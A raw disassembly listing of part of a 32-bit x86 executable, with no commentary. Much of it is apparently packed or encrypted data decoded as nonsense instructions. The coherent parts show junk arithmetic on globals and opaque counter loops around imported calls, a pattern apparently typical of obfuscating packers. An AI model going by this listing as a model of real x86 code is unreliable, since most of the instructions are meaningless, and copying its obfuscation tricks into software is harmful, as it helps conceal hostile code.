  40aa40:	cmp    al,0xd6
  40aa42:	ins    BYTE PTR es:[edi],dx
  40aa43:	xor    al,BYTE PTR [ebp-0x4]
  40aa46:	call   0xfd919889
  40aa4b:	add    eax,0xa1520628
  40aa50:	popf   
  40aa51:	xchg   edx,eax
  40aa52:	pop    ds
  40aa53:	aad    0xa4
  40aa55:	xchg   esi,eax
  40aa56:	or     ecx,DWORD PTR ds:0xfcdbe911
  40aa5c:	and    edi,edx
  40aa5e:	fwait
  40aa5f:	add    ebp,DWORD PTR [esi]
  40aa61:	shr    DWORD PTR [edx],cl
  40aa63:	das    
  40aa64:	popf   
  40aa65:	adc    BYTE PTR [edi+0x4d],dl
  40aa68:	pop    edi
  40aa69:	lods   al,BYTE PTR ds:[esi]
  40aa6a:	sub    dl,BYTE PTR [ebx+edx*2]
  40aa6d:	js     0x40aa4d
  40aa6f:	in     eax,dx
  40aa70:	lods   eax,DWORD PTR ds:[esi]
  40aa71:	jge    0x40aaa6
  40aa73:	rol    BYTE PTR [ecx+0x4346d315],1
  40aa79:	add    bh,bh
  40aa7b:	inc    esi
  40aa7c:	inc    ebx
  40aa7d:	add    BYTE PTR [ebx],al
  40aa7f:	shr    ecx,1
  40aa81:	jno    0x40aa9d
  40aa83:	add    BYTE PTR [eax],al
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x434673,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x43477b
  40aa9b:	sub    ebx,DWORD PTR ds:0x43478b
  40aaa1:	mov    DWORD PTR ds:0x43477b,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x43473b
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	movntps XMMWORD PTR [ebp+0x7efefc5f],xmm5
  40aad1:	jle    0x40ab43
  40aad3:	jns    0x40ab53
  40aad5:	jle    0x40ab16
  40aad7:	inc    edx
  40aad8:	scas   eax,DWORD PTR es:[edi]
  40aad9:	ret    0xb852
  40aadc:	in     eax,dx
  40aadd:	push   ebp
  40aade:	pop    edx
  40aadf:	mov    al,ds:0x94e62703
  40aae4:	es dec edx
  40aae6:	mov    ecx,ss
  40aae8:	jb     0x40aa83
  40aaea:	xor    eax,0x6f4d8095
  40aaef:	aad    0xdc
  40aaf1:	xor    ah,0x50
  40aaf4:	mov    eax,0x79c3026a
  40aaf9:	push   ebp
  40aafa:	int    0x94
  40aafc:	test   DWORD PTR [edi+0x5e],esi
  40aaff:	sbb    bh,BYTE PTR [edx]
  40ab01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab02:	fsub   st(6),st
  40ab04:	or     ecx,DWORD PTR [ecx-0x3d]
  40ab07:	or     eax,0xabac5ef5
  40ab0c:	push   es
  40ab0d:	sbb    al,0xaa
  40ab0f:	xor    DWORD PTR [edi],ebx
  40ab11:	fidiv  WORD PTR [ebp-0x11]
  40ab14:	push   ebp
  40ab15:	jle    0x40ab72
  40ab17:	dec    ecx
  40ab18:	fsub   DWORD PTR [edx+0x6c]
  40ab1b:	in     al,dx
  40ab1c:	jmp    0x6033:0xa033de40
  40ab23:	inc    ebp
  40ab24:	fs enter 0xbbea,0x7c
  40ab29:	test   al,0x49
  40ab2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab2c:	push   0x1b
  40ab2e:	mov    ah,BYTE PTR [edi-0xed72c8f]
  40ab34:	fimul  WORD PTR [ebx]
  40ab36:	into   
  40ab37:	pop    eax
  40ab38:	or     dh,BYTE PTR [edx-0x52d73205]
  40ab3e:	cmp    eax,0xc766b57c
  40ab43:	and    ebx,eax
  40ab45:	mov    edx,0x116bcec8
  40ab4a:	scas   eax,DWORD PTR es:[edi]
  40ab4b:	sub    edx,DWORD PTR [eax]
  40ab4d:	idiv   BYTE PTR [eax-0x64]
  40ab50:	outs   dx,BYTE PTR ds:[esi]
  40ab51:	adc    BYTE PTR [ecx],cl
  40ab53:	sbb    DWORD PTR [eax-0x6e2a6d30],esi
  40ab59:	fcomp  QWORD PTR [esi+0x1e3d7ec0]
  40ab5f:	jb     0x40ab56
  40ab61:	std    
  40ab62:	invlpg BYTE PTR [ebx+edx*8]
  40ab66:	shl    DWORD PTR [ecx],cl
  40ab68:	sub    bh,BYTE PTR [eax+eiz*4-0x53dea937]
  40ab6f:	in     al,dx
  40ab70:	aam    0xc
  40ab72:	scas   al,BYTE PTR es:[edi]
  40ab73:	jmp    0x40ab30
  40ab75:	dec    esp
  40ab76:	sbb    al,0x21
  40ab78:	xor    bl,BYTE PTR [eax+0x52]
  40ab7b:	nop
  40ab7c:	in     eax,dx
  40ab7d:	jns    0x40ab1f
  40ab7f:	push   ebx
  40ab80:	es sub al,0xef
  40ab83:	jne    0x40ab46
  40ab85:	add    edx,DWORD PTR [ecx+edx*4]
  40ab88:	stc    
  40ab89:	popa   
  40ab8a:	inc    edx
  40ab8b:	dec    ebx
  40ab8c:	jo     0x40abca
  40ab8e:	imul   ebx,DWORD PTR [ecx],0xc9bf79d5
  40ab94:	(bad)  
  40ab95:	icebp  
  40ab96:	dec    edi
  40ab97:	or     BYTE PTR [edi+eiz*8],dl
  40ab9a:	int    0xea
  40ab9c:	scas   eax,DWORD PTR es:[edi]
  40ab9d:	sti    
  40ab9e:	mul    ecx
  40aba0:	ror    DWORD PTR ds:0x1d1f06b7,cl
  40aba6:	xchg   esi,eax
  40aba7:	xchg   esp,eax
  40aba8:	fidivr WORD PTR [edx+0x48]
  40abab:	mov    esi,edi
  40abad:	adc    DWORD PTR [edi+0xb13d0e3],edx
  40abb3:	loopne 0x40ac14
  40abb5:	fwait
  40abb6:	push   es
  40abb7:	test   BYTE PTR ds:0xd5958ded,bl
  40abbd:	sar    BYTE PTR [ebx+0x2da22dd8],cl
  40abc3:	inc    edi
  40abc4:	adc    al,0xa2
  40abc6:	mov    ebp,0xfe48f324
  40abcb:	xor    eax,0x7fc59519
  40abd0:	lods   eax,DWORD PTR ds:[esi]
  40abd1:	xchg   ebx,eax
  40abd2:	adc    al,0x35
  40abd4:	push   0xfbb63553
  40abd9:	stos   BYTE PTR es:[edi],al
  40abda:	cmp    eax,0xb6917892
  40abdf:	and    BYTE PTR [edi+0x2b],0xf0
  40abe3:	aas    
  40abe4:	stos   DWORD PTR es:[edi],eax
  40abe5:	pop    esi
  40abe6:	pusha  
  40abe7:	jp     0x40ab7e
  40abe9:	jbe    0x40abd3
  40abeb:	mov    edi,0xa12e8c51
  40abf0:	(bad)
  40abf5:	shr    BYTE PTR [ecx-0x2e4a72ca],0x60
  40abfc:	loope  0x40ab8a
  40abfe:	xor    edi,DWORD PTR [ebx]
  40ac00:	push   ebx
  40ac01:	repz fidiv WORD PTR cs:[edi-0x586325e9]
  40ac09:	sub    BYTE PTR [ebp-0x383c4f9b],bl
  40ac0f:	sahf   
  40ac10:	jmp    0xc38f:0x292132a2
  40ac17:	or     ch,BYTE PTR [ebx+esi*4-0x19]
  40ac1b:	lea    edx,[ecx]
  40ac1d:	mov    al,0x6a
  40ac1f:	out    0x32,al
  40ac21:	lds    ebp,FWORD PTR [esi-0x9]
  40ac24:	push   es
  40ac25:	adc    DWORD PTR [ebx+0x17],ecx
  40ac28:	add    DWORD PTR [eax-0x2a6d974d],esp
  40ac2e:	ja     0x40abbc
  40ac30:	mov    bl,0xa
  40ac32:	sbb    ebp,DWORD PTR [ecx+0xb]
  40ac35:	shl    DWORD PTR ds:0xf6f0e7d3,1
  40ac3b:	push   ebx
  40ac3c:	cmp    BYTE PTR [edi+0x24],cl
  40ac3f:	int3   
  40ac40:	nop
  40ac41:	fisub  WORD PTR [edi-0x7cb6f51e]
  40ac47:	sbb    DWORD PTR [ecx-0x7b],eax
  40ac4a:	aas    
  40ac4b:	or     ecx,0xacd813c8
  40ac51:	sti    
  40ac52:	ret    
  40ac53:	ins    BYTE PTR es:[edi],dx
  40ac54:	xor    esi,DWORD PTR [esi]
  40ac56:	call   ebx
  40ac58:	das    
  40ac59:	mov    ah,0x5f
  40ac5b:	test   al,0x47
  40ac5d:	pop    ebx
  40ac5e:	test   al,0x1d
  40ac60:	xchg   ebp,eax
  40ac61:	sbb    bl,BYTE PTR fs:[esp+ebp*4]
  40ac65:	aas    
  40ac66:	sub    DWORD PTR [eax+0x28],eax
  40ac69:	sub    DWORD PTR [ecx-0x5c],eax
  40ac6c:	pop    ds
  40ac6d:	mov    dh,0x55
  40ac6f:	popf   
  40ac70:	imul   esp,DWORD PTR [esi],0x778e16ae
  40ac76:	inc    esi
  40ac77:	outs   dx,BYTE PTR ds:[esi]
  40ac78:	jno    0x40aca3
  40ac7a:	push   ecx
  40ac7b:	icebp  
  40ac7c:	imul   DWORD PTR [esi+0xd0d259]
  40ac82:	das    
  40ac83:	gs stos DWORD PTR es:[edi],eax
  40ac85:	inc    edx
  40ac86:	xor    al,0x9d
  40ac88:	aaa    
  40ac89:	mov    cl,0xe7
  40ac8b:	js     0x40ac84
  40ac8d:	and    esp,DWORD PTR ds:0x664b9370
  40ac93:	push   ss
  40ac94:	test   al,0x39
  40ac96:	cmp    DWORD PTR [edi-0x3e33839e],esi
  40ac9c:	sbb    dl,0x74
  40ac9f:	jne    0x40ac6b
  40aca1:	or     edx,DWORD PTR ds:0x29a8f19d
  40aca7:	ret    0xe392
  40acaa:	stos   DWORD PTR es:[edi],eax
  40acab:	add    eax,0xa39eb7ad
  40acb0:	pop    ds
  40acb1:	fiadd  DWORD PTR ds:0xc92437a4
  40acb7:	pop    edi
  40acb8:	nop
  40acb9:	add    DWORD PTR [edx+0x57e33f18],ebp
  40acbf:	(bad)  
  40acc0:	pop    ds
  40acc1:	retf   0xa974
  40acc4:	add    edx,DWORD PTR [edx+0x16c796ff]
  40acca:	push   ss
  40accb:	add    edx,DWORD PTR [ecx+0x46]
  40acce:	pop    ss
  40accf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd0:	xor    esi,DWORD PTR [eax-0x14]
  40acd3:	and    ah,BYTE PTR [edi+0x5e08d9a7]
  40acd9:	mov    eax,gs
  40acdb:	popa   
  40acdc:	or     eax,0xfad6908d
  40ace1:	mov    ebp,0xe5b50974
  40ace6:	fdivr  DWORD PTR [edi+eax*4-0x70]
  40acea:	jb     0x40ad36
  40acec:	scas   eax,DWORD PTR es:[edi]
  40aced:	(bad)  
  40acee:	mov    bl,0x84
  40acf0:	add    eax,0x66fa6dc1
  40acf5:	mov    dl,0xb0
  40acf7:	aad    0xc0
  40acf9:	add    BYTE PTR [ecx+eiz*1+0xc],dl
  40acfd:	inc    esi
  40acfe:	call   0x5635:0x719e6d97
  40ad05:	lock loopne 0x40ad27
  40ad08:	jle    0x40ace0
  40ad0a:	dec    ebp
  40ad0b:	addr16 and al,0xce
  40ad0e:	pusha  
  40ad0f:	cld    
  40ad10:	cmp    DWORD PTR [ebx-0x6885ab4f],ebx
  40ad16:	lahf   
  40ad17:	sub    al,0x83
  40ad19:	dec    edx
  40ad1a:	jmp    0x40ad01
  40ad1c:	mov    bh,0x3d
  40ad1e:	test   eax,0xc9af6a19
  40ad23:	call   0x19e68051
  40ad28:	xchg   ebx,eax
  40ad29:	clc    
  40ad2a:	push   ds
  40ad2b:	inc    esp
  40ad2c:	add    al,0xcc
  40ad2e:	sbb    esp,DWORD PTR [edi]
  40ad30:	pop    esi
  40ad31:	mov    esi,DWORD PTR [edx]
  40ad33:	adc    al,0xec
  40ad35:	add    BYTE PTR [eax+0x15],ah
  40ad38:	pop    es
  40ad39:	daa    
  40ad3a:	sar    BYTE PTR [ecx],0x9f
  40ad3d:	mov    ds:0x4bc770fd,al
  40ad42:	xchg   edi,eax
  40ad43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad44:	dec    esp
  40ad45:	jl     0x40ad25
  40ad47:	scas   eax,DWORD PTR es:[edi]
  40ad48:	lods   eax,DWORD PTR ds:[esi]
  40ad49:	jb     0x40ad71
  40ad4b:	push   eax
  40ad4c:	das    
  40ad4d:	or     cl,ah
  40ad4f:	mov    WORD PTR [ebx+0x25],ds
  40ad52:	es pop esp
  40ad54:	fisubr WORD PTR [esi]
  40ad56:	inc    ecx
  40ad57:	ins    DWORD PTR es:[edi],dx
  40ad58:	push   ecx
  40ad59:	add    DWORD PTR [edx],0x23
  40ad5c:	retf   0x72bb
  40ad5f:	jmp    0xf99b:0xbaf06730
  40ad66:	cdq    
  40ad67:	sbb    al,0xd3
  40ad69:	sbb    BYTE PTR [edx+eiz*4-0x2d64eb60],al
  40ad70:	inc    ecx
  40ad71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad72:	pop    ds
  40ad73:	push   ecx
  40ad74:	xlat   BYTE PTR ds:[ebx]
  40ad75:	icebp  
  40ad76:	fiadd  WORD PTR [edi+0x42]
  40ad79:	(bad)  
  40ad7a:	mov    ebp,0x76b917e4
  40ad7f:	repnz pop edx
  40ad81:	repz push edi
  40ad83:	add    al,0x97
  40ad85:	aad    0xec
  40ad87:	leave  
  40ad88:	call   0x8ab1:0x232dd100
  40ad8f:	ins    BYTE PTR es:[edi],dx
  40ad90:	jbe    0x40ad65
  40ad92:	mov    bl,BYTE PTR [esi-0x5ae5849b]
  40ad98:	sub    DWORD PTR [ebp+0xa],0x78517d97
  40ad9f:	cmp    bl,BYTE PTR [eax+0x3f]
  40ada2:	mov    ch,0xec
  40ada4:	shl    DWORD PTR [edi-0x57],0x82
  40ada8:	sbb    BYTE PTR [edi],0x50
  40adab:	fiadd  DWORD PTR [eax-0x5c]
  40adae:	out    0x8,al
  40adb0:	(bad)  [edi]
  40adb2:	retf   
  40adb3:	add    edi,DWORD PTR [edx+0x2]
  40adb6:	jecxz  0x40ad87
  40adb8:	sbb    BYTE PTR [esi-0x52],bl
  40adbb:	inc    ebp
  40adbc:	retf   0x2ec7
  40adbf:	inc    eax
  40adc0:	sbb    eax,0xd712872f
  40adc5:	test   DWORD PTR [esi-0x335fb719],ebp
  40adcb:	(bad)  
  40adcc:	cld    
  40adcd:	cmp    DWORD PTR [esi],ebp
  40adcf:	cmp    al,0xc9
  40add1:	hlt    
  40add2:	iret   
  40add3:	mov    DWORD PTR [esi-0x160a11a0],esp
  40add9:	leave  
  40adda:	das    
  40addb:	jl     0x40ad94
  40addd:	mov    bl,0xcd
  40addf:	int    0x94
  40ade1:	aad    0x83
  40ade3:	or     eax,0x3e5872b3
  40ade8:	cld    
  40ade9:	call   0xdb80:0x653825c4
  40adf0:	or     ch,dh
  40adf2:	inc    ebx
  40adf3:	iret   
  40adf4:	int3   
  40adf5:	push   es
  40adf6:	and    ebp,DWORD PTR ds:0x7cfe2193
  40adfc:	nop
  40adfd:	sbb    BYTE PTR [edi+0x50],al
  40ae00:	mov    ebx,0x97057361
  40ae05:	xchg   esp,eax
  40ae06:	pop    ss
  40ae07:	mov    al,0xa0
  40ae09:	pop    ebx
  40ae0a:	cdq    
  40ae0b:	mov    BYTE PTR [bp+si],cl
  40ae0e:	and    eax,0xcf923bf
  40ae13:	mov    bl,0x29
  40ae15:	(bad)  [esi]
  40ae17:	outs   dx,DWORD PTR ds:[esi]
  40ae18:	cwde   
  40ae19:	retf   
  40ae1a:	hlt    
  40ae1b:	mov    ds:0xcbfde547,al
  40ae20:	adc    al,0xf0
  40ae22:	adc    DWORD PTR [ebx],0x2d80249c
  40ae28:	push   ecx
  40ae2a:	cmp    eax,DWORD PTR [ebp-0x46]
  40ae2d:	fimul  DWORD PTR [edi+0x64cde8dc]
  40ae33:	das    
  40ae34:	test   DWORD PTR [ebx],ebx
  40ae36:	inc    edi
  40ae37:	mov    cs,WORD PTR [edi-0x185e6eb3]
  40ae3d:	rcr    BYTE PTR ds:[eax-0x316eb51b],0x1
  40ae45:	sub    BYTE PTR [ebp+0x6b],bl
  40ae48:	sub    ebx,eax
  40ae4a:	pushf  
  40ae4b:	leave  
  40ae4c:	mov    al,ds:0xefe1112
  40ae51:	(bad)  
  40ae52:	lods   al,BYTE PTR ds:[esi]
  40ae53:	(bad)  
  40ae54:	push   esi
  40ae55:	jg     0x40ae41
  40ae57:	pushf  
  40ae58:	iret   
  40ae59:	push   ebx
  40ae5a:	jno    0x40ae1d
  40ae5c:	das    
  40ae5d:	sahf   
  40ae5e:	sar    BYTE PTR [esi-0x59e7b67],cl
  40ae64:	xor    BYTE PTR [ebp+0x11],dl
  40ae67:	aaa    
  40ae68:	mov    WORD PTR [ebp-0x201e8d07],?
  40ae6e:	les    eax,FWORD PTR ds:0xce387b9a
  40ae74:	adc    al,cl
  40ae76:	out    0x19,al
  40ae78:	cmp    ebp,esp
  40ae7a:	xlat   BYTE PTR ds:[ebx]
  40ae7b:	or     eax,0x8c83a8ee
  40ae80:	add    cl,ch
  40ae82:	out    0x81,al
  40ae84:	adc    ebx,esp
  40ae86:	repz aaa 
  40ae88:	and    eax,0xffffffd9
  40ae8b:	imul   edi,DWORD PTR ds:0xa85d60b2,0x60
  40ae92:	add    ebp,edi
  40ae94:	aad    0x3e
  40ae96:	push   ecx
  40ae97:	addr16 sub eax,0x3133b087
  40ae9d:	retf   0x7fd1
  40aea0:	jno    0x40aec0
  40aea2:	pushf  
  40aea3:	in     eax,dx
  40aea4:	mov    dh,BYTE PTR [ecx]
  40aea6:	add    esi,eax
  40aea8:	jmp    0xc151:0x7e6bce65
  40aeaf:	(bad)  
  40aeb0:	scas   al,BYTE PTR es:[edi]
  40aeb1:	icebp  
  40aeb2:	lods   al,BYTE PTR ds:[esi]
  40aeb3:	in     al,dx
  40aeb4:	pop    ds
  40aeb5:	dec    esp
  40aeb6:	test   eax,0xc2b82d39
  40aebb:	fcmovnbe st,st(7)
  40aebd:	cld    
  40aebe:	push   es
  40aebf:	push   ss
  40aec0:	pop    ebp
  40aec1:	push   0xb29283ce
  40aec6:	data16 jb 0x40af2c
  40aec9:	mov    eax,0x9963f81f
  40aece:	cmc    
  40aecf:	pop    edi
  40aed0:	add    edx,ecx
  40aed2:	imul   edx,edi
  40aed5:	xor    ebx,DWORD PTR ds:0x4346d3
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x4346c7,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x4346bf,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x43477f,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43470f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x43466f,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x4346bb,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x4346c7,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x4346c7
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x4346c7,ebx
  40af4d:	cmp    DWORD PTR ds:0x4346c7,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x4346c7,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x4346f7
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43470b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434793,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434793
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434793,ebx
  40afaa:	cmp    DWORD PTR ds:0x434793,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434793,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	popf   
  40affc:	dec    edx
  40affd:	or     BYTE PTR [edx],bh
  40afff:	idiv   dl
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	and    al,0x16
  40b009:	dec    ebp
  40b00a:	out    dx,al
  40b00b:	pop    ss
  40b00c:	ret    
  40b00d:	dec    edx
  40b00e:	sbb    eax,0xe86d96b0
  40b013:	dec    edx
  40b014:	or     DWORD PTR [edi-0x74],eax
  40b017:	std    
  40b018:	xor    DWORD PTR [ebp+0x37da840b],0x1fa6d293
  40b022:	dec    ebp
  40b023:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b024:	sub    bh,dh
  40b026:	pusha  
  40b027:	or     eax,0xc45720b3
  40b02c:	fimul  DWORD PTR [edx-0x700d2b07]
  40b032:	mov    bh,0xb8
  40b034:	pop    eax
  40b035:	js     0x40affa
  40b037:	push   eax
  40b038:	aaa    
  40b039:	ret    0x840d
  40b03c:	mov    ch,0xf6
  40b03e:	push   esp
  40b03f:	mov    dl,0x77
  40b041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b042:	cwde   
  40b043:	and    bl,BYTE PTR [esp+eax*4]
  40b046:	mov    esi,esi
  40b048:	jbe    0x40b044
  40b04a:	jl     0x40b000
  40b04c:	(bad)  
  40b04d:	int    0x7a
  40b04f:	and    ebp,DWORD PTR [eax]
  40b051:	dec    esp
  40b052:	inc    edi
  40b053:	daa    
  40b054:	fnsave [edi+0x4daa8e28]
  40b05a:	jnp    0x40b0a4
  40b05c:	and    al,0x11
  40b05e:	retf   0x25ef
  40b061:	push   0xffffff91
  40b063:	or     esi,esi
  40b065:	iret   
  40b066:	test   ebx,ebp
  40b068:	sbb    BYTE PTR [esi+0x71],ah
  40b06b:	dec    ecx
  40b06c:	jo     0x40b084
  40b06e:	pop    esp
  40b06f:	mov    dh,0xbe
  40b071:	(bad)  
  40b072:	dec    edx
  40b073:	loope  0x40b05b
  40b075:	test   BYTE PTR [ebx-0x6c579310],0x76
  40b07c:	inc    eax
  40b07d:	mov    esi,0xbfaa9f92
  40b082:	inc    ebx
  40b083:	jo     0x40b03f
  40b085:	mov    edi,0xb27dc5a4
  40b08a:	popf   
  40b08b:	xchg   ebx,eax
  40b08c:	add    dl,bh
  40b08e:	sbb    al,0x42
  40b090:	les    ebp,FWORD PTR [esi-0x20dc45dd]
  40b096:	cmp    al,dh
  40b098:	dec    ebx
  40b099:	sbb    eax,0xd2c1cf12
  40b09e:	enter  0x9b60,0x13
  40b0a2:	adc    eax,0x2c2b9dab
  40b0a7:	scas   al,BYTE PTR es:[edi]
  40b0a8:	sbb    ebx,DWORD PTR ss:[ebx+0x1d]
  40b0ac:	jno    0x40b0df
  40b0ae:	fcmovne st,st(4)
  40b0b0:	test   al,0xae
  40b0b2:	xor    al,BYTE PTR [edi]
  40b0b4:	rol    DWORD PTR [ebx-0x7cf1f2c],cl
  40b0ba:	ret    
  40b0bb:	jne    0x40b11b
  40b0bd:	or     al,0x7
  40b0bf:	test   dl,ch
  40b0c1:	dec    eax
  40b0c2:	cmp    DWORD PTR [edx],esp
  40b0c4:	dec    edx
  40b0c5:	or     DWORD PTR [edx+0x35],eax
  40b0c8:	add    al,0xaa
  40b0ca:	mov    dh,0x46
  40b0cc:	jbe    0x40b07d
  40b0ce:	jns    0x40b147
  40b0d0:	push   ebp
  40b0d1:	mov    ch,cl
  40b0d3:	int    0x2
  40b0d5:	cmp    eax,0x81840b2
  40b0da:	loopne 0x40b137
  40b0dc:	dec    esp
  40b0dd:	out    0xa4,al
  40b0df:	retf   
  40b0e0:	mov    al,ds:0xab108571
  40b0e5:	jb     0x40b138
  40b0e7:	pop    eax
  40b0e8:	jecxz  0x40b145
  40b0ea:	mov    ch,0x6d
  40b0ec:	mov    bh,dl
  40b0ee:	jecxz  0x40b0a1
  40b0f0:	add    BYTE PTR ds:0xb3e7123b,ah
  40b0f6:	push   edi
  40b0f7:	cmp    DWORD PTR [ebx-0x4b],edi
  40b0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0fb:	sbb    edx,0xffffffa1
  40b0fe:	add    ebp,ecx
  40b100:	jecxz  0x40b095
  40b102:	loope  0x40b0bb
  40b104:	outs   dx,BYTE PTR ds:[esi]
  40b105:	jae    0x40b13e
  40b107:	adc    BYTE PTR [ecx+0x25],ch
  40b10a:	in     al,0xb9
  40b10c:	mov    bl,BYTE PTR [ebx+0x57cbcbe]
  40b112:	pop    ds
  40b113:	mov    ch,0x4
  40b115:	shr    BYTE PTR [edi+0x18219a89],cl
  40b11b:	icebp  
  40b11c:	push   ebp
  40b11d:	test   DWORD PTR [eax-0x6cd2bd90],esp
  40b123:	sub    al,0xa1
  40b125:	fst    QWORD PTR ds:0x624d1ab5
  40b12b:	adc    bh,BYTE PTR [ecx+0x51]
  40b12e:	and    ch,BYTE PTR [eax+0x43]
  40b131:	scas   eax,DWORD PTR es:[edi]
  40b132:	repnz stc 
  40b134:	inc    DWORD PTR [ebx+0x69]
  40b137:	(bad)
  40b13a:	out    0x65,eax
  40b13c:	mov    ch,0xa9
  40b13e:	shl    BYTE PTR [ebp+ebp*2+0x6991b0bb],0x41
  40b146:	aaa    
  40b147:	loop   0x40b126
  40b149:	int    0x4f
  40b14b:	push   ss
  40b14c:	pushf  
  40b14d:	arpl   WORD PTR [eax+0x615f6d07],cx
  40b153:	ja     0x40b16c
  40b155:	(bad)
  40b15a:	hlt    
  40b15b:	and    BYTE PTR [edi+0x39],0x71
  40b15f:	int3   
  40b160:	or     edi,DWORD PTR [edi+ebp*4+0x68581b2e]
  40b167:	sbb    ah,BYTE PTR [edi-0x3c3def9f]
  40b16d:	ja     0x40b10f
  40b16f:	sub    al,0x7d
  40b171:	dec    ecx
  40b172:	dec    eax
  40b173:	push   0x6b226ed1
  40b178:	adc    BYTE PTR [ecx+0x8],ch
  40b17b:	dec    ebx
  40b17c:	sahf   
  40b17d:	inc    eax
  40b17e:	pop    eax
  40b17f:	xchg   edi,eax
  40b180:	inc    ecx
  40b181:	jb     0x40b16d
  40b183:	mov    edi,0xd5f08299
  40b188:	lods   eax,DWORD PTR ds:[esi]
  40b189:	loopne 0x40b111
  40b18b:	push   esp
  40b18c:	test   BYTE PTR [edx+ebp*2+0x1e754f89],bl
  40b193:	lea    eax,[ebx]
  40b195:	(bad)  
  40b196:	idiv   bh
  40b198:	inc    edx
  40b199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b19a:	mov    esi,edx
  40b19c:	popf   
  40b19d:	xchg   ebp,eax
  40b19e:	int3   
  40b19f:	cwde   
  40b1a0:	fs pusha 
  40b1a2:	xor    eax,0x832bae92
  40b1a7:	cmp    BYTE PTR ds:0x8231dec0,0x7f
  40b1ae:	push   ebx
  40b1af:	das    
  40b1b0:	adc    ah,BYTE PTR [ecx-0x68b224ff]
  40b1b6:	cmp    ebp,DWORD PTR [eax]
  40b1b8:	jno    0x40b214
  40b1ba:	sbb    dl,al
  40b1bc:	repz shl esp,0xbb
  40b1c0:	sub    DWORD PTR [edi-0x3fe5007],edx
  40b1c6:	out    0x48,eax
  40b1c8:	jle    0x40b1e6
  40b1ca:	add    al,0x28
  40b1cc:	test   al,0x99
  40b1ce:	pusha  
  40b1cf:	sbb    al,0x3d
  40b1d1:	jmp    0x40b1da
  40b1d3:	test   BYTE PTR [ecx-0x7a],al
  40b1d6:	push   eax
  40b1d7:	js     0x40b1f7
  40b1d9:	or     BYTE PTR [esi],dh
  40b1db:	mov    eax,0x207237c7
  40b1e0:	jnp    0x40b1dc
  40b1e2:	mov    ah,0x5d
  40b1e4:	gs mov cl,0x37
  40b1e7:	pop    esp
  40b1e8:	xchg   edx,eax
  40b1e9:	data16 stos BYTE PTR es:[edi],al
  40b1eb:	xor    eax,0x6ee89517
  40b1f0:	lahf   
  40b1f1:	push   ebp
  40b1f2:	gs push esp
  40b1f4:	sub    esi,DWORD PTR ds:0xa27b6d24
  40b1fa:	dec    edx
  40b1fb:	mov    esi,0xa10cf32f
  40b200:	inc    ebx
  40b201:	cmp    al,0xa
  40b203:	popf   
  40b204:	mov    ch,BYTE PTR [esi-0x61]
  40b207:	fucomi st,st(7)
  40b209:	jge    0x40b26c
  40b20b:	mov    es,WORD PTR [eax]
  40b20d:	call   0x5240:0xf8b62a94
  40b214:	sub    DWORD PTR [eax+0x3e5845eb],esi
  40b21a:	in     eax,dx
  40b21b:	jbe    0x40b25b
  40b21d:	dec    esi
  40b21e:	pushf  
  40b21f:	xchg   esp,eax
